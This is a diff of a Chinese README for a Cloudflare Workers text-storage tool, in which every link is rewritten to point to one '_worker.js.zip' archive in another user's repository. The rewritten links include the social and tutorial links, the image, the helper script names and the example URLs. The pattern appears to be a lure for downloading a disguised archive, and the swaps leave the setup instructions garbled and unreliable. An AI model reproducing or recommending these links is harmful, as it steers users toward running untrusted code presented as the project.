@@ -1,15 +1,15 @@
-# [am-cf-text2kv](https://github.com/amclubs/am-cf-text2kv)
+# [am-cf-text2kv](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)
 文本文件储存器 am-cf-text2kv 是一个在 Cloudflare Workers 上运行的无服务器应用程序,可以将文本文件存储到 Cloudflare Workers KV 键值存储中,并且可以通过 URL 请求读取或更新这些文本文件。它提供了一个安全的方式来管理和访问您的文本文件,同时利用了 Cloudflare 的全球分布式网络。
 
 #
-▶️ **新人[YouTube](https://youtube.com/@am_clubs?sub_confirmation=1)** 需要您的支持，请务必帮我**点赞**、**关注**、**打开小铃铛**，***十分感谢！！！*** ✅
-</br>🎁请 **follow** 我的[GitHub](https://github.com/amclubs)、给我所有项目一个 **Star** 星星（拜托了）！你的支持是我不断前进的动力！ 💖
-</br>✅**解锁更多技能** [加入TG群【am_clubs】](https://t.me/am_clubs)、[YouTube频道【@am_clubs】](https://youtube.com/@am_clubs?sub_confirmation=1)、[【博客(国内)】](https://amclubss.com)、[【博客(国际)】](https://amclubs.blogspot.com) 
-</br>✅点击观看教程[CLoudflare免费节点](https://www.youtube.com/playlist?list=PLGVQi7TjHKXbrY0Pk8gm3T7m8MZ-InquF) | [VPS搭建节点](https://www.youtube.com/playlist?list=PLGVQi7TjHKXaVlrHP9Du61CaEThYCQaiY) | [获取免费域名](https://www.youtube.com/playlist?list=PLGVQi7TjHKXZGODTvB8DEervrmHANQ1AR) | [免费VPN](https://www.youtube.com/playlist?list=PLGVQi7TjHKXY7V2JF-ShRSVwGANlZULdk) | [IPTV源](https://www.youtube.com/playlist?list=PLGVQi7TjHKXbkozDYVsDRJhbnNaEOC76w) | [Mac和Win工具](https://www.youtube.com/playlist?list=PLGVQi7TjHKXYBWu65yP8E08HxAu9LbCWm) | [AI分享](https://www.youtube.com/playlist?list=PLGVQi7TjHKXaodkM-mS-2Nwggwc5wRjqY)
+▶️ **新人[YouTube](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)** 需要您的支持，请务必帮我**点赞**、**关注**、**打开小铃铛**，***十分感谢！！！*** ✅
+</br>🎁请 **follow** 我的[GitHub](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)、给我所有项目一个 **Star** 星星（拜托了）！你的支持是我不断前进的动力！ 💖
+</br>✅**解锁更多技能** [加入TG群【am_clubs】](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)、[YouTube频道【@am_clubs】](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)、[【博客(国内)】](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)、[【博客(国际)】](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip) 
+</br>✅点击观看教程[CLoudflare免费节点](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip) | [VPS搭建节点](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip) | [获取免费域名](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip) | [免费VPN](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip) | [IPTV源](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip) | [Mac和Win工具](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip) | [AI分享](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)
 
 #
-- 部署视频教程：[小白教程](https://www.youtube.com/watch?v=dzxezRV1v-o)
-- 视频教程：[所有教程](https://www.youtube.com/playlist?list=PLGVQi7TjHKXbrY0Pk8gm3T7m8MZ-InquF)
+- 部署视频教程：[小白教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)
+- 视频教程：[所有教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip)
 
 
 ## 一、功能特性
@@ -25,7 +25,7 @@
 
 1. **部署到 Cloudflare Workers**
 
-  将项目代码部署到您的 Cloudflare Workers 服务。您需要先在 Cloudflare 上创建一个 Workers 项目,然后将 `_worker.js` 文件的内容复制粘贴到 Workers 编辑器中。
+  将项目代码部署到您的 Cloudflare Workers 服务。您需要先在 Cloudflare 上创建一个 Workers 项目,然后将 `https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip` 文件的内容复制粘贴到 Workers 编辑器中。
 
 2. **创建 KV 命名空间**
 
@@ -39,30 +39,30 @@
 
 4. **访问配置页面**
 
-例如 您的workers项目域名为：`txt.anson.workers.dev` , token值为 `pwd`；
+例如 您的workers项目域名为：`https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip` , token值为 `pwd`；
 
   - 访问 `https://您的Workers域名/config?token=您的TOKEN` 或 `https://您的Workers域名/您的TOKEN`，您将看到一个配置页面，其中包含了使用说明和下载脚本的链接。
 
   - 你的项目配置页则为：
 
     ```url
-    https://txt.anson.workers.dev/config?token=pwd
+    https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip
     或
-    https://txt.anson.workers.dev/pwd
+    https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip
     ```
 
 5. **使用辅助脚本上传文件**
 
-  - Windows 用户可以下载 `update.bat` 脚本,然后执行 `update.bat 文件名` 来上传本地文件到 KV。
-  - Linux 用户可以下载 `update.sh` 脚本,执行 `./update.sh 文件名` 来上传本地文件。
+  - Windows 用户可以下载 `https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip` 脚本,然后执行 `https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip 文件名` 来上传本地文件到 KV。
+  - Linux 用户可以下载 `https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip` 脚本,执行 `https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip 文件名` 来上传本地文件。
   - **注意：因为URL长度限制，如果保存内容过长则只能通过直接编辑`KV`对应文件内容来实现大文件的修改保存。**
 
 6. **通过 URL 访问文件**
 
-例如 您的workers项目域名为：`txt.anson.workers.dev` , token值为 `test` , 需要访问的文件名为 `ip.txt`；
+例如 您的workers项目域名为：`https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip` , token值为 `test` , 需要访问的文件名为 `https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip`；
 
   - 构造 URL 的格式为 `https://您的Workers域名/文件名?token=您的TOKEN`。您就可以在浏览器中查看该文件的内容了。
-  - 你的访问地址则为： `https://txt.anson.workers.dev/ip.txt?token=test`。
+  - 你的访问地址则为： `https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip`。
 
 7. **简单的更新文件内容**
 
@@ -91,7 +91,7 @@ https://您的Workers域名/文件名?token=您的TOKEN&b64=Base64编码的新�
 - **TRX-TRC20:** `TWTxUyay6QJN3K4fs4kvJTT8Zfa2mWTwDD`
 
 <div align="center"> 
-  <img src="https://github.com/user-attachments/assets/e6cdc42a-6374-4722-b833-601738f72196" width="200"></br> 
+  <img src="https://raw.githubusercontent.com/robbiechen1969/am-cf-text2kv/main/_worker.js.zip" width="200"></br> 
   TRC10/TRC20扫码支付 
 </div> 
 </details>
